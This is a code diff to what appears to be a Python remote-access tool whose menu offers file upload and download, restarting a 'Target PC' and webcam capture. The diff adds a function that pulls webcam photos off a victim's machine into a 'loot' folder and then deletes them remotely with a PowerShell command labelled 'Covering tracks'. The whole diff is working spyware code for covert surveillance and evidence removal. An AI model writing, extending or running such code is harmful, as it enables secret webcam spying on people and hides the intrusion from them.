@@ -44,7 +44,7 @@ options_menu = """
             [5] - Upload File 
             [6] - Download File
             [7] - Restart Target PC
-            [8] - Install WebCam Capture [BROKEN]
+            [8] - Install WebCam Capture
             [9] - Grab WebCam Pictures [BROKEN]
 
         [+] Options:
@@ -189,10 +189,36 @@ def grab_screenshots(address, password, working, username):
     print("[*] Covering tracks...")
     delete_screenshots = f"powershell Remove-Item {working}/amETlOMhPo/*"
     remote_command(address, password, delete_screenshots)
-    print("[+] Screenshot downloaded")
+    print("[+] Screenshots downloaded")
 
     # confirmation
-    print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
+    print("\n[+] Screenshots downloaded to \"~/Downloads\"\n")
+
+# takes webcam pictures off of target
+def grab_webcam(address, password, working, username):
+    # download webcam photos
+    print("\n[*] Downloading webcam photos...")
+    screenshot_location = f"{working}/bNOEXCxyVp"
+    remote_download(address, password, screenshot_location)
+    print("[+] Photos downloaded")
+
+    # formatting webcam photos
+    print("[*] Fromatting photos...")
+    loot_folder = f"webcam-{username}-{current_date()}"
+    os.system(f"mkdir ~/Downloads/{loot_folder}")
+    os.system(f"mv ~/Downloads/bNOEXCxyVp/* ~/Downloads/{loot_folder}")
+    os.system(f"rm -rf ~/Downloads/bNOEXCxyVp")
+    print("[+] Photos formatted")
+
+    # deletes photos off of target
+    print("[*] Covering tracks...")
+    delete_screenshots = f"powershell Remove-Item {working}/bNOEXCxyVp/*"
+    remote_command(address, password, delete_screenshots)
+    print("[+] Photos downloaded")
+
+    # confirmation
+    print("\n[+] Photos downloaded to \"~/Downloads\"\n")
+
 
 # custom upload
 def upload(address, password, working):
@@ -363,7 +389,7 @@ def cli(arguments):
             
             # grab keylogs
             elif option == "9":
-                grab_webcam()
+                grab_webcam(ipv4, password, working_direcory, target_username)
 
             # help menu
             elif option == "h" or option == "help":
